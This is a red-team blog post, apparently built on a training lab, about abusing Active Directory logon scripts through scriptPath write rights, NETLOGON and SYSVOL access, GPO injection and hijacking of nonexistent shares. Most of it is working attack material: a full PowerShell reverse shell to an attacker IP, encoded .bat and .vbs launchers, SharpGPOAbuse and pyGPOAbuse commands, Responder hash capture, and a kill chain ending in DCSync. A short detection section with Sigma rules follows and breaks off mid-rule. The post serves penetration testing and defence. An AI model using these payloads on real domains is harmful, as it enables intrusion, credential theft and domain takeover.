---
title: "Logon Scripts Abuse — Deep Dive into scriptPath, SYSVOL & GPO Persistence"
date: 2026-03-18 14:00:00 +0200
categories: [Active Directory, DACL Attacks]
tags: [active-directory, red-team, logon-scripts, scriptPath, SYSVOL, NETLOGON, dacl, persistence, lateral-movement, MITRE-T1037]
description: "A complete offensive guide to abusing Active Directory logon scripts — covering scriptPath DACL misconfigurations, SYSVOL/NETLOGON write access, stub script hijacking, GPO-based persistence, detection, and real-world attack scenarios."
image:
  path: /assets/img/posts/logon-scripts/banner.png
  alt: "Logon Scripts Abuse — Active Directory Red Team Guide"
toc: true
---

## Overview

In Active Directory environments, **logon scripts** are a feature administrators rely on to automate user tasks at domain login — mapping drives, configuring environments, auditing systems, and running maintenance commands. Behind the scenes, they are among the most **consistently misconfigured** and most **under-monitored** attack surfaces in any mature domain.

According to Spencer Alessi (author of [ScriptSentry](https://github.com/techspence/ScriptSentry)), logon script misconfigurations appear in **30–40% of red team engagements**. This guide is a complete deep dive into every offensive dimension of logon script abuse — from understanding the attribute mechanics to chaining it into full domain compromise.

---

## MITRE ATT&CK Mapping

| Technique | ID | Tactic |
|---|---|---|
| Boot or Logon Initialization Scripts | [T1037](https://attack.mitre.org/techniques/T1037/) | Persistence, Privilege Escalation |
| Network Logon Script | [T1037.003](https://attack.mitre.org/techniques/T1037/003/) | Persistence, Privilege Escalation |
| Domain Policy Modification (GPO) | [T1484.001](https://attack.mitre.org/techniques/T1484/001/) | Defense Evasion, Privilege Escalation |
| Account Manipulation | [T1098](https://attack.mitre.org/techniques/T1098/) | Persistence |
| Lateral Movement via Logon | [T1021](https://attack.mitre.org/techniques/T1021/) | Lateral Movement |

---

## Background: How Logon Scripts Work

In Active Directory, system administrators use logon scripts to automate tasks when users log into the domain: mapping/unmapping network drives, auditing, gathering information, and environment customisation.

There are two methods for assigning a logon script to a user:

1. **Via the `scriptPath` attribute** — Set through the *Logon script* field in the *Profile* tab of ADUC (Active Directory Users and Computers). Internally updates the `scriptPath` attribute on the user object. These are called **Legacy logon scripts**.

2. **Via Group Policy** — Set through `User Configuration → Windows Settings → Scripts (Logon/Logoff) → Logon`. These are called **Modern logon scripts** and additionally support PowerShell.

```
Attack Surface Overview
═══════════════════════════════════════════════════════════════════
  Domain Controller
  ┌─────────────────────────────────────────────────────────────┐
  │                                                             │
  │   AD Object: CN=eliot,CN=Users,DC=inlanefreight,DC=local    │
  │   Attribute: scriptPath = "EliotsScripts\logon.bat"         │
  │                                                             │
  │   \\DC01\NETLOGON\EliotsScripts\logon.bat   ◄──── [RWX]     │
  │          │                                       hossam     │
  │          │ executes on login                               │
  │          ▼                                                  │
  │   Workstation (eliot logs in)                               │
  │   → powershell -enc <PAYLOAD>                               │
  └─────────────────────────────────────────────────────────────┘
```

---

## The `scriptPath` Attribute

Defined in [MS-ADA3](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-ada3/c640630e-23ff-44e7-886f-16df9574039e), the [scriptPath](https://learn.microsoft.com/en-us/windows/win32/adschema/a-scriptpath) attribute (part of the [User-Logon property set](https://learn.microsoft.com/en-us/windows/win32/adschema/r-user-logon)) specifies the path for a user's logon script.

`scriptPath` supports:
- Batch files (`*.bat`, `*.cmd`)
- Executable programs (`*.exe`)
- VBScript and JScript via Windows Script Host
- [KiXtart](http://www.kixtart.org/) scripts

> **Important:** `scriptPath` does **not** support PowerShell directly — but you can invoke PowerShell from within `.bat` or `.vbs` files.

For replication across all domain controllers, Windows stores logon scripts in the **SYSVOL** network share:

```
Physical path:  %systemroot%\SYSVOL\sysvol\<DOMAIN_DNS_NAME>\scripts\
Network share:  \\<DC>\NETLOGON\
Environment:    $env:LOGONSERVER\NETLOGON\
```

> Legacy logon scripts set via `scriptPath` **must** reside inside NETLOGON. They cannot point to any other share — local or remote.

---

## Attack Vectors at a Glance

```
┌─────────────────────────────────────────────────────────────────────┐
│              LOGON SCRIPT ABUSE — ATTACK DECISION TREE              │
├─────────────────────────────────────────────────────────────────────┤
│                                                                     │
│  Do you have WriteProperty on target user's scriptPath?             │
│  ├─ YES ──► Can you write anywhere in NETLOGON?                     │
│  │          ├─ YES ──► [SCENARIO A] Drop payload → update scriptPath│
│  │          └─ NO  ──► [SCENARIO B] Use existing scriptPath stub    │
│  │                      → find writable file scriptPath points to   │
│  └─ NO  ──► Do you have WriteProperty/WriteDACL on a GPO?           │
│             ├─ YES ──► [SCENARIO C] Modify GPO logon script         │
│             └─ NO  ──► Can you write to SYSVOL/NETLOGON directly?   │
│                        ├─ YES ──► [SCENARIO D] Replace script file  │
│                        └─ NO  ──► Enumerate for credentials in      │
│                                   existing logon scripts            │
└─────────────────────────────────────────────────────────────────────┘
```

---

## Scenario Setup

Our client **inlanefreight** has provided us the username **hossam** and password **`HossamR3dT3am!`** to determine what DACL attacks the user can perform against the user **eliot**.

| Role | Username | Password | Notes |
|---|---|---|---|
| Attacker | `hossam` | `HossamR3dT3am!` | Domain user with write rights over eliot |
| Victim | `eliot` | *(unknown)* | Target — logs on periodically |
| Domain | `inlanefreight.local` | — | |
| DC IP | `10.129.229.224` | — | |
| Attacker IP | `10.10.14.55` | — | Kali / Pwnbox |

---

## Enumeration from Linux

### PywerView

[PywerView](https://github.com/the-useless-one/pywerview) is a partial Python port of PowerSploit's PowerView, letting us use all the powerful Cmdlets from Linux.

#### Installation

```bash
root@root$ sudo apt install libkrb5-dev -y
git clone https://github.com/the-useless-one/pywerview.git
cd pywerview/ && pip3 install -r requirements.txt
```

#### Getting ACEs of Hossam over Eliot

```bash
root@root$ python3 pywerview get-objectacl --name 'eliot' \
    -w inlanefreight.local \
    -t 10.129.229.224 \
    -u 'hossam' \
    -p 'HossamR3dT3am!' \
    --resolve-sids \
    --resolve-guids
```

```
objectdn:               CN=eliot,CN=Users,DC=inlanefreight,DC=local
objectsid:              S-1-5-21-3456308105-2521031762-2678499478-2104
acetype:                ACCESS_DENIED_OBJECT_ACE
binarysize:             40
aceflags:               
accessmask:             256
activedirectoryrights:  extended_right
isinherited:            False
securityidentifier:     Everyone
objectaceflags:         object_ace_type_present
objectacetype:          User-Change-Password
inheritedobjectacetype: All
iscallbak:              False

<SNIP>
```

To filter only ACEs that `hossam` has over `eliot`:

```bash
root@root$ python3 pywerview get-objectacl --name 'eliot' \
    -w inlanefreight.local \
    -t 10.129.229.224 \
    -u 'hossam' \
    -p 'HossamR3dT3am!' \
    --resolve-sids \
    --resolve-guids \
    --json | jq '.results | map(select(.securityidentifier | contains("hossam")))'
```

```json
[
  {
    "objectdn": "CN=eliot,CN=Users,DC=inlanefreight,DC=local",
    "objectsid": "S-1-5-21-3456308105-2521031762-2678499478-2104",
    "acetype": "ACCESS_ALLOWED_OBJECT_ACE",
    "binarysize": 56,
    "aceflags": [
      "container_inherit"
    ],
    "accessmask": 48,
    "activedirectoryrights": [
      "read_property",
      "write_property"
    ],
    "isinherited": false,
    "securityidentifier": "CN=hossam,CN=Users,DC=inlanefreight,DC=local",
    "objectaceflags": [
      "object_ace_type_present"
    ],
    "objectacetype": "Script-Path",
    "inheritedobjectacetype": "All",
    "iscallbak": false
  }
]
```

**Result:** `hossam` has **`read_property`** and **`write_property`** on `eliot`'s `Script-Path` → full read/write on `scriptPath`.

---

### dacledit (Impacket)

```bash
root@root$ python3 examples/dacledit.py \
    -principal 'hossam' \
    -target 'eliot' \
    -dc-ip 10.129.229.224 \
    inlanefreight.local/'hossam':'HossamR3dT3am!'
```

```
Impacket v0.9.25.dev1+20230823.145202.4518279 - Copyright 2021 SecureAuth Corporation

[*] Parsing DACL
[*] Printing parsed DACL
[*] Filtering results for SID (S-1-5-21-3456308105-2521031762-2678499478-1108)
[*]   ACE[7] info
[*]     ACE Type                  : ACCESS_ALLOWED_OBJECT_ACE
[*]     ACE flags                 : None
[*]     Access mask               : ReadProperty, WriteProperty
[*]     Flags                     : ACE_OBJECT_TYPE_PRESENT
[*]     Object type (GUID)        : Script-Path (bf9679a8-0de6-11d0-a285-00aa003049e2)
[*]     Trustee (SID)             : Hossam (S-1-5-21-3456308105-2521031762-2678499478-1108)
```

**Result:** `hossam` has `ReadProperty` and `WriteProperty` over GUID `bf9679a8-0de6-11d0-a285-00aa003049e2` → this is the `scriptPath` attribute.

---

### Adalanche (Graph-Based Enumeration)

[Adalanche](https://github.com/lkarlslund/Adalanche) is a BloodHound-like graph tool that detects over **90 edge types** including `WriteScriptPath` — which BloodHound CE does not display.

#### Installation

```bash
root@root$ sudo wget -P /usr/bin/ https://go.dev/dl/go1.22.1.linux-amd64.tar.gz
sudo rm -rf /usr/bin/go && cd /usr/bin/ && sudo tar -xzf go1.22.1.linux-amd64.tar.gz

root@root$ export PATH=$PATH:/usr/bin/go/bin
go version
# go version go1.22.1 linux/amd64

root@root$ git clone https://github.com/lkarlslund/Adalanche Adalanche
cd Adalanche
git checkout 7774681
pwsh build.ps1
```

#### Data Collection

```bash
root@root$ ./adalanche-linux-x64-v2024.1.11-43-g7774681 collect activedirectory \
    --domain inlanefreight.local \
    --server 10.129.229.224 \
    --username 'hossam' \
    --password 'HossamR3dT3am!'
```

#### Data Analysis

```bash
root@root$ ./adalanche-linux-x64-v2024.1.11-44-gf1573f2 analyze --datapath data
```

In the Adalanche UI:
1. Use LDAP query `(objectClass=user)` to load domain users
2. Right-click on the **hossam** node → *"What can this node pwn?"*
3. Observe the **WriteScriptPath** edge pointing from `hossam` to `eliot`

```
Adalanche Graph — WriteScriptPath Edge
═════════════════════════════════════════════════════════════

   [hossam]  ──── WriteScriptPath ────►  [eliot]
       │                                     │
  Attacker                              Victim user
  (has write                          (scriptPath will
   on scriptPath)                      be updated)
```

---

## Enumeration from Windows

### PowerView

```powershell
PS C:\Users\Hossam\Downloads> Import-Module .\PowerView.ps1
PS C:\Users\Hossam\Downloads> $HossamSID = (Get-DomainUser -Identity hossam).objectSID
PS C:\Users\Hossam\Downloads> Get-DomainObjectAcl -Identity eliot -ResolveGUIDs | ?{$_.SecurityIdentifier -eq $HossamSID}
```

```
AceQualifier           : AccessAllowed
ObjectDN               : CN=eliot,CN=Users,DC=inlanefreight,DC=local
ActiveDirectoryRights  : ReadProperty, WriteProperty
ObjectAceType          : Script-Path
ObjectSID              : S-1-5-21-3456308105-2521031762-2678499478-2104
InheritanceFlags       : ContainerInherit
BinaryLength           : 56
AceType                : AccessAllowedObject
ObjectAceFlags         : ObjectAceTypePresent
IsCallback             : False
PropagationFlags       : None
SecurityIdentifier     : S-1-5-21-3456308105-2521031762-2678499478-2103
AccessMask             : 48
AuditFlags             : None
IsInherited            : False
AceFlags               : ContainerInherit
InheritedObjectAceType : All
OpaqueLength           : 0
```

`ActiveDirectoryRights: ReadProperty, WriteProperty` on `ObjectAceType: Script-Path` — confirmed.

---

## Scenario A — Write `scriptPath` from Linux (Classic)

> **Condition:** hossam has `WriteProperty` on eliot's `scriptPath` AND has `RWX` somewhere in NETLOGON.

### Full Attack Flow

```
  ┌──────────────────────────────────────────────────────────────────┐
  │                  SCENARIO A — ATTACK FLOW                        │
  ├──────────────────────────────────────────────────────────────────┤
  │                                                                  │
  │  1. Enumerate NETLOGON for writable folders                      │
  │        ↓                                                         │
  │  2. Create malicious .bat payload with PowerShell reverse shell  │
  │        ↓                                                         │
  │  3. Upload payload to writable NETLOGON folder via smbclient    │
  │        ↓                                                         │
  │  4. Update eliot's scriptPath → point to payload                 │
  │        ↓                                                         │
  │  5. Start nc listener                                            │
  │        ↓                                                         │
  │  6. Wait for eliot to log on → catch reverse shell              │
  │        ↓                                                         │
  │  7. Domain compromise via eliot's session                        │
  └──────────────────────────────────────────────────────────────────┘
```

### Step 1 — Enumerate NETLOGON

```bash
root@root$ smbclient //10.129.229.224/NETLOGON -U hossam%'HossamR3dT3am!' -c "ls"
```

```
  .                                   D        0  Mon May  6 04:03:40 2024
  ..                                  D        0  Mon May  6 04:03:40 2024
  CC1FDFA0FF3A                        D        0  Mon May  6 04:05:41 2024
  CCEDF2EBD2F1                        D        0  Thu May  2 15:36:45 2024
  DEFB03023DDA                        D        0  Mon May  6 04:10:40 2024
  EliotsScripts                       D        0  Fri May  3 09:34:55 2024
  <SNIP>
```

Check permissions on `EliotsScripts`:

```bash
root@root$ smbcacls //10.129.229.224/NETLOGON /EliotsScripts -U Hossam%'HossamR3dT3am!'
```

```
REVISION:1
CONTROL:SR|DI|DP
OWNER:BUILTIN\Administrators
GROUP:INLANEFREIGHT\Domain Users
ACL:INLANEFREIGHT\hossam:ALLOWED/OI|CI/RWX
ACL:BUILTIN\Administrators:ALLOWED/I/FULL
ACL:CREATOR OWNER:ALLOWED/OI|CI|IO|I/FULL
ACL:NT AUTHORITY\Authenticated Users:ALLOWED/OI|CI|I/READ
ACL:NT AUTHORITY\SYSTEM:ALLOWED/OI|CI|I/FULL
```

`hossam` has `R`, `W`, `X` → we can write our payload here.

### Step 2 — Create the Payload

Generate a PowerShell reverse shell (using PowerShell #1 from [revshells.com](https://www.revshells.com/)):

```powershell
$LHOST = "10.10.14.55"; $LPORT = 9001; $TCPClient = New-Object Net.Sockets.TCPClient($LHOST, $LPORT); $NetworkStream = $TCPClient.GetStream(); $StreamReader = New-Object IO.StreamReader($NetworkStream); $StreamWriter = New-Object IO.StreamWriter($NetworkStream); $StreamWriter.AutoFlush = $true; $Buffer = New-Object System.Byte[] 1024; while ($TCPClient.Connected) { while ($NetworkStream.DataAvailable) { $RawData = $NetworkStream.Read($Buffer, 0, $Buffer.Length); $Code = ([text.encoding]::UTF8).GetString($Buffer, 0, $RawData -1) }; if ($TCPClient.Connected -and $Code.Length -gt 1) { $Output = try { Invoke-Expression ($Code) 2>&1 } catch { $_ }; $StreamWriter.Write("$Output`n"); $Code = $null } }; $TCPClient.Close(); $NetworkStream.Close(); $StreamReader.Close(); $StreamWriter.Close()
```

Base64-encode it to avoid escaping issues in a `.bat` file:

```bash
root@root$ python3 -c 'import base64; print(base64.b64encode((r"""$LHOST = "10.10.14.55"; $LPORT = 9001; $TCPClient = New-Object Net.Sockets.TCPClient($LHOST, $LPORT); $NetworkStream = $TCPClient.GetStream(); $StreamReader = New-Object IO.StreamReader($NetworkStream); $StreamWriter = New-Object IO.StreamWriter($NetworkStream); $StreamWriter.AutoFlush = $true; $Buffer = New-Object System.Byte[] 1024; while ($TCPClient.Connected) { while ($NetworkStream.DataAvailable) { $RawData = $NetworkStream.Read($Buffer, 0, $Buffer.Length); $Code = ([text.encoding]::UTF8).GetString($Buffer, 0, $RawData -1) }; if ($TCPClient.Connected -and $Code.Length -gt 1) { $Output = try { Invoke-Expression ($Code) 2>&1 } catch { $_ }; $StreamWriter.Write("$Output`n"); $Code = $null } }; $TCPClient.Close(); $NetworkStream.Close(); $StreamReader.Close(); $StreamWriter.Close()""").encode("utf-16-le")).decode())'
```

Create `logonScript.bat`:

```bat
powershell -ExecutionPolicy Bypass -WindowStyle Hidden -EncodedCommand JABMAEgATwBTAFQAIAA9ACAAIgAxADAALgAxADAALgAxADQALgA1ADUAIgA7ACAAJABMAFAATwBSAFQAIAA9ACAAOQA...<SNIP>
```

Alternatively, a `.vbs` version (more evasive — no visible console window):

```vbs
CreateObject("Wscript.shell").Run "powershell -ExecutionPolicy Bypass -WindowStyle Hidden -EncodedCommand JABMAEgATwBTAFQAIAA9ACAAIgAxADAALgAxADAALgAxADQALgA1ADUAIgA7AC...<SNIP>"
```

### Step 3 — Upload Payload to NETLOGON

```bash
root@root$ smbclient //10.129.229.224/NETLOGON --directory EliotsScripts \
    -U Hossam%'HossamR3dT3am!' \
    -c "put logonScript.bat"
```

```
putting file logonScript.bat as \EliotsScripts\logonScript.bat (1070.3 kb/s) (average 1070.3 kb/s)
```

### Step 4 — Update `eliot`'s `scriptPath`

#### Method 1: ldapmodify

Create `logonScript.ldif`:

```ldif
dn: CN=eliot,CN=Users,DC=inlanefreight,DC=local
changetype: modify
replace: scriptPath
scriptPath: EliotsScripts\logonScript.bat
```

Apply it:

```bash
root@root$ ldapmodify -H ldap://10.129.229.224 \
    -x \
    -D 'hossam@inlanefreight.local' \
    -w 'HossamR3dT3am!' \
    -f logonScript.ldif
```

```
modifying entry "CN=eliot,CN=Users,DC=inlanefreight,DC=local"
```

Verify:

```bash
root@root$ ldapsearch -LLL -H ldap://10.129.229.224 \
    -x \
    -D 'hossam@inlanefreight.local' \
    -w 'HossamR3dT3am!' \
    -b "DC=inlanefreight,DC=local" \
    "(sAMAccountName=eliot)" scriptPath
```

```
dn: CN=eliot,CN=Users,DC=inlanefreight,DC=local
scriptPath: EliotsScripts\logonScript.bat
```

#### Method 2: bloodyAD

```bash
root@root$ pip install bloodyAD

root@root$ bloodyAD --host "10.129.229.224" \
    -d "inlanefreight.local" \
    -u "hossam" \
    -p 'HossamR3dT3am!' \
    set object eliot scriptPath \
    -v 'EliotsScripts\logonScript.bat'
```

```
['EliotsScripts\\logonScript.bat']
[+] eliot's scriptPath has been updated
```

Verify:

```bash
root@root$ bloodyAD --host "10.129.229.224" \
    -d "inlanefreight.local" \
    -u "hossam" \
    -p 'HossamR3dT3am!' \
    get object eliot --attr scriptPath
```

```
distinguishedName: CN=eliot,CN=Users,DC=inlanefreight,DC=local
scriptPath: EliotsScripts\logonScript.bat
```

### Step 5 — Wait for Shell

```bash
root@root$ nc -nvlp 9001

listening on [any] 9001 ...
connect to [10.10.14.55] from (UNKNOWN) [10.129.229.224] 49732
whoami
inlanefreight\eliot
```

We now have a shell as `eliot`.

---

## Scenario A (Windows) — Write `scriptPath` from Windows

### Step 1 — Enumerate NETLOGON from PowerShell

```powershell
PS C:\Users\hossam> ls $env:LOGONSERVER\NETLOGON
```

```
    Directory: \\DC03\NETLOGON

Mode                LastWriteTime         Length Name
----                -------------         ------ ----
d-----         5/2/2024  12:21 PM                EF0ACCC0DBED
d-----         5/3/2024   6:34 AM                EliotsScripts
<SNIP>
```

```powershell
PS C:\Users\hossam> icacls $env:LOGONSERVER\NETLOGON\EliotsScripts
```

```
\\DC03\NETLOGON\EliotsScripts INLANEFREIGHT\hossam:(OI)(CI)(RX,W)
                              NT AUTHORITY\Authenticated Users:(I)(RX)
                              BUILTIN\Administrators:(I)(F)
                              NT AUTHORITY\SYSTEM:(I)(F)
                              CREATOR OWNER:(I)(OI)(CI)(IO)(F)

Successfully processed 1 files; Failed processing 0 files
```

`hossam` has `R`, `W`, `X`.

### Step 3 — Update `eliot`'s `scriptPath` via PowerView

```powershell
PS C:\Users\Hossam> Import-Module .\PowerView.ps1
PS C:\Users\Hossam> Set-DomainObject eliot -Set @{'scriptPath'='EliotsScripts\logonScript.bat'}
```

Verify:

```powershell
PS C:\Users\Hossam> Get-DomainObject eliot -Properties scriptPath

scriptpath
----------
EliotsScripts\logonScript.bat
```

---

## Scenario B — Stub Script Hijacking

> **Condition:** hossam has `ReadProperty` on eliot's `scriptPath`, but no write anywhere in NETLOGON. However, `scriptPath` points to a file on a **different share** where hossam has write permissions.

This is the "stub script" pattern — an admin creates a tiny launcher in NETLOGON that calls the real script from another share.

```
  NETLOGON\scripts\eliot_stub.bat
  ─────────────────────────────────────────────
  @echo off
  call \\fileserver\Share\IT\eliot_real.bat
```

If `hossam` has write on `\\fileserver\Share\IT\`, they can modify `eliot_real.bat` directly — no need to touch `scriptPath` or NETLOGON at all.

### Enumerate the stub

```bash
root@root$ python3 pywerview get-objectacl --name 'eliot' \
    -w inlanefreight.local \
    -t 10.129.229.224 \
    -u 'hossam' \
    -p 'HossamR3dT3am!' \
    --resolve-sids --resolve-guids --json | \
    jq '.results | map(select(.objectacetype == "Script-Path"))'
```

Read the current `scriptPath` value:

```bash
root@root$ ldapsearch -LLL -H ldap://10.129.229.224 \
    -x -D 'hossam@inlanefreight.local' \
    -w 'HossamR3dT3am!' \
    -b "DC=inlanefreight,DC=local" \
    "(sAMAccountName=eliot)" scriptPath
```

```
dn: CN=eliot,CN=Users,DC=inlanefreight,DC=local
scriptPath: scripts\eliot_stub.bat
```

Read the stub file to find the real script path:

```bash
root@root$ smbclient //10.129.229.224/NETLOGON -U Hossam%'HossamR3dT3am!' \
    -c "get scripts\eliot_stub.bat /tmp/eliot_stub.bat"

root@root$ cat /tmp/eliot_stub.bat
@echo off
call \\fileserver\Share\IT\eliot_real.bat
```

Check permissions on the real script:

```bash
root@root$ smbcacls //fileserver/Share /IT/eliot_real.bat -U Hossam%'HossamR3dT3am!'
```

If write is available — inject the payload directly into `eliot_real.bat`.

---

## Scenario C — GPO Logon Script Persistence

> **Condition:** hossam has `WriteDACL` or `GenericWrite` on a GPO linked to an OU containing eliot.

GPO-based logon scripts support **PowerShell** (unlike `scriptPath`), making them more powerful and stealthier.

### Enumerate GPO Write Rights (Linux)

```bash
root@root$ python3 examples/GetGPOUsers.py \
    -u hossam \
    -p 'HossamR3dT3am!' \
    -d inlanefreight.local \
    -dc-ip 10.129.229.224
```

Or with BloodHound CE — look for:
- `GenericWrite` → GPO node
- `WriteDACL` → GPO node
- `GenericAll` → GPO node

### Enumerate GPO Write Rights (Windows)

```powershell
# Find GPOs hossam can write to
Get-DomainGPO | ForEach-Object {
    $gpo = $_
    $acl = Get-DomainObjectAcl -Identity $gpo.distinguishedname -ResolveGUIDs
    $acl | Where-Object {
        $_.SecurityIdentifier -eq $HossamSID -and 
        $_.ActiveDirectoryRights -match "Write|GenericAll"
    } | Select-Object @{n='GPO';e={$gpo.displayname}}, ActiveDirectoryRights
}
```

### Inject PowerShell Payload via GPO (SharpGPOAbuse)

```powershell
PS C:\Tools> .\SharpGPOAbuse.exe --AddUserScript \
    --ScriptName logon.ps1 \
    --ScriptContents "powershell -ep bypass -w hidden -enc JABMAEgATwBTAFQA..." \
    --GPOName "Default Domain Policy" \
    --UserAccount eliot
```

Or from Linux using [pyGPOAbuse](https://github.com/X-C3LL/GPOwned):

```bash
root@root$ python3 pygpoabuse.py \
    -u hossam \
    -p 'HossamR3dT3am!' \
    -d inlanefreight.local \
    -dc-ip 10.129.229.224 \
    -gpo-id "31B2F340-016D-11D2-945F-00C04FB984F9" \
    -powershell \
    -command "powershell -ep bypass -nop -w hidden -enc JABMAEgATwBTAFQA..."
```

### GPO Logon Script Attack Flow

```
  ┌────────────────────────────────────────────────────────────────────┐
  │                   GPO LOGON SCRIPT ATTACK FLOW                     │
  ├────────────────────────────────────────────────────────────────────┤
  │                                                                    │
  │  hossam  ──► GenericWrite on GPO "HR-Users-Policy"                │
  │                │                                                   │
  │                ▼                                                   │
  │  Inject malicious logon.ps1 into GPO via SharpGPOAbuse             │
  │  Upload logon.ps1 to SYSVOL\{GPO-GUID}\User\Scripts\Logon\        │
  │                │                                                   │
  │                ▼                                                   │
  │  GPO is linked to OU=HR-Users → all HR user accounts affected      │
  │                │                                                   │
  │                ▼                                                   │
  │  Any user in OU logs on → logon.ps1 executes                      │
  │  → reverse shell back to hossam's listener                        │
  └────────────────────────────────────────────────────────────────────┘
```

---

## Scenario D — ScriptSentry: Automated Misconfiguration Discovery

[ScriptSentry](https://github.com/techspence/ScriptSentry) automates discovery of misconfigurations in logon scripts, detecting:

| Check | Description |
|---|---|
| Unsafe UNC Folder Permissions | World-writable folders referenced by logon scripts |
| Unsafe UNC File Permissions | Writable script files on UNC paths |
| Unsafe Logon Script Permissions | Scripts in SYSVOL writable by low-privilege users |
| Unsafe GPO Logon Script Permissions | GPO scripts with weak ACLs |
| Unsafe NETLOGON/SYSVOL Permissions | Domain Users can write to SYSVOL root |
| Plaintext Credentials | Credentials hardcoded in logon scripts |
| Nonexistent Shares | Scripts referencing shares that no longer exist (hijackable DNS) |
| Admin Logon Scripts | High-value accounts with logon scripts assigned |

```powershell
PS C:\Tools> .\Invoke-ScriptSentry.ps1
```

```
########## Unsafe logon script permissions ##########

Type                        File                                                       User                       Rights
----                        ----                                                       ----                       ------
UnsafeLogonScriptPermission \\inlanefreight.local\sysvol\...\scripts\logonScript.bat  INLANEFREIGHT\daniel       Modify, Synchronize


########## Plaintext credentials ##########

Type        File                              Credential
----        ----                              ----------
Credentials \\inlanefreight.local\...\scriptShare.cmd  net use h: \\DC03.inlanefreight.local\Shared\General /user:wayne Access2AllUsersSecure!


########## Admins with logonscripts ##########

Type              User                                       LogonScript
----              ----                                       -----------
AdminLogonScript  CN=adminuser,OU=Admins,DC=...              run.vbs
```

> **High-value finding:** Any admin account with a logon script (`AdminLogonScript`) that references a writable file is a direct path to domain compromise.

---

## Scenario E — Nonexistent Share Hijacking

ScriptSentry also detects logon scripts referencing shares on **servers that no longer exist in DNS**. If the attacker can register that DNS name (e.g., by adding a computer account or poisoning DNS), they can serve a malicious SMB share that the logon script connects to — capturing Net-NTLMv2 hashes or delivering a payload.

```
  ┌──────────────────────────────────────────────────────────────┐
  │           NONEXISTENT SHARE HIJACK FLOW                      │
  ├──────────────────────────────────────────────────────────────┤
  │                                                              │
  │  Logon script references: \\OLD-SERVER\Scripts\logon.bat    │
  │                                                              │
  │  OLD-SERVER no longer exists in DNS                          │
  │                                                              │
  │  Attacker adds DNS A record: OLD-SERVER → 10.10.14.55        │
  │  (via MachineAccountQuota or compromised DNS admin)          │
  │                                                              │
  │  Attacker starts Responder or impacket-smbserver             │
  │                                                              │
  │  Victim logs in → connects to attacker's share               │
  │  → Net-NTLMv2 hash captured → cracked offline               │
  │     OR relay to another service                              │
  └──────────────────────────────────────────────────────────────┘
```

```bash
# Set up rogue SMB server
root@root$ impacket-smbserver SCRIPTS /tmp/payload -smb2support

# Or use Responder to capture hashes
root@root$ responder -I eth0 -rdwv
```

---

## Full Kill Chain: From scriptPath Write to Domain Admin

This is a real-world chained scenario combining `scriptPath` write, lateral movement, and privilege escalation.

```
┌─────────────────────────────────────────────────────────────────────────┐
│          FULL KILL CHAIN — scriptPath → Domain Admin                    │
├─────────────────────────────────────────────────────────────────────────┤
│                                                                         │
│  [Phase 1 — Initial Access]                                             │
│  hossam (low-priv user) is compromised via phishing                    │
│                │                                                        │
│                ▼                                                        │
│  [Phase 2 — Discovery]                                                  │
│  Enumerate ACEs → hossam has WriteProperty on eliot's scriptPath       │
│  Enumerate NETLOGON → hossam has RWX on EliotsScripts folder           │
│                │                                                        │
│                ▼                                                        │
│  [Phase 3 — Persistence Implant]                                        │
│  Drop reverse shell payload in NETLOGON\EliotsScripts\logon.bat        │
│  Update eliot's scriptPath → EliotsScripts\logon.bat                  │
│                │                                                        │
│                ▼                                                        │
│  [Phase 4 — Execution]                                                  │
│  eliot logs in → logon.bat executes → shell caught on nc listener      │
│                │                                                        │
│                ▼                                                        │
│  [Phase 5 — Privilege Escalation]                                       │
│  Enumerate eliot's rights → eliot has ForceChangePassword on Sam       │
│  Reset Sam's password → Sam is member of IT Admins                     │
│                │                                                        │
│                ▼                                                        │
│  [Phase 6 — Domain Compromise]                                          │
│  Use Sam's credentials → DCSync → dump all hashes → DA                 │
│                                                                         │
└─────────────────────────────────────────────────────────────────────────┘
```

---

## Read `scriptPath` — The Passive Attack Vector

If `hossam` only has **read** rights on `eliot`'s `scriptPath` (default for all domain users), this is still valuable:

```bash
# Read eliot's scriptPath
root@root$ ldapsearch -LLL -H ldap://10.129.229.224 \
    -x -D 'hossam@inlanefreight.local' \
    -w 'HossamR3dT3am!' \
    -b "DC=inlanefreight,DC=local" \
    "(sAMAccountName=eliot)" scriptPath

# Inspect permissions on the file it points to
# If scriptPath = "share\script.bat"  → check \\DC\NETLOGON\share\script.bat
root@root$ smbcacls //10.129.229.224/NETLOGON /share/script.bat \
    -U Hossam%'HossamR3dT3am!'
```

If the file is writable by `hossam` — you have full code execution on `eliot`'s next login without ever needing to modify `scriptPath`.

---

## Read `scriptPath` — Credential Hunting

Logon scripts frequently contain **plaintext credentials** for mapping drives. Reading them can yield:

```bash
# Bulk read all domain users' scriptPath values
root@root$ ldapsearch -LLL -H ldap://10.129.229.224 \
    -x -D 'hossam@inlanefreight.local' \
    -w 'HossamR3dT3am!' \
    -b "DC=inlanefreight,DC=local" \
    "(objectClass=user)" scriptPath | grep scriptPath

# Download and grep for credentials
root@root$ smbclient //10.129.229.224/NETLOGON -U Hossam%'HossamR3dT3am!' \
    -c "ls scripts/"

root@root$ smbclient //10.129.229.224/NETLOGON -U Hossam%'HossamR3dT3am!' \
    -c "get scripts\scriptShare.cmd /tmp/scriptShare.cmd"

root@root$ grep -iE "password|passwd|pwd|/user:|net use" /tmp/scriptShare.cmd
```

```
net use h: \\DC03.inlanefreight.local\Shared\General /user:wayne Access2AllUsersSecure!
```

---

## Detection

### Windows Event IDs to Monitor

| Event ID | Source | What it captures |
|---|---|---|
| **4738** | Security | User account changed — fires when `scriptPath` is modified |
| **5136** | Directory Service | AD object attribute modified — fires on `scriptPath` change |
| **5145** | Security | Network share object access — fires on NETLOGON/SYSVOL access |
| **4663** | Security | File access in NETLOGON — fires on script file creation/modification |
| **4656** | Security | Handle request — fires when opening logon script files |
| **4624** | Security | Logon — correlate with unusual login times post-scriptPath change |
| **4688** | Security | Process creation — `powershell.exe` spawned by `userinit.exe` |

### Sigma Rules

#### Detect `scriptPath` Modification (Event ID 5136)

```yaml
title: Active Directory scriptPath Attribute Modified
id: a8e1b5d2-3f47-4c1e-9b82-0d5c3a1f4e67
status: stable
description: Detects modification of the scriptPath attribute on a user object in Active Directory
references:
  - https://attack.mitre.org/techniques/T1037/003/
logsource:
  product: windows
  service: security
detection:
  selection:
    EventID: 5136
    AttributeLDAPDisplayName: 'scriptPath'
    OperationType: 'Value Added'
  condition: selection
falsepositives:
  - Legitimate administrator changes to logon scripts
level: high
tags:
  - attack.persistence
  - attack.t1037.003
```

#### Detect PowerShell Spawned by Userinit (Logon Script Execution)

```yaml
title: PowerShell Spawned via Logon Script
id: b3c2d4e1-8a9f-4b3e-a1c2-9d8e7f6b5a4c
status: experimental
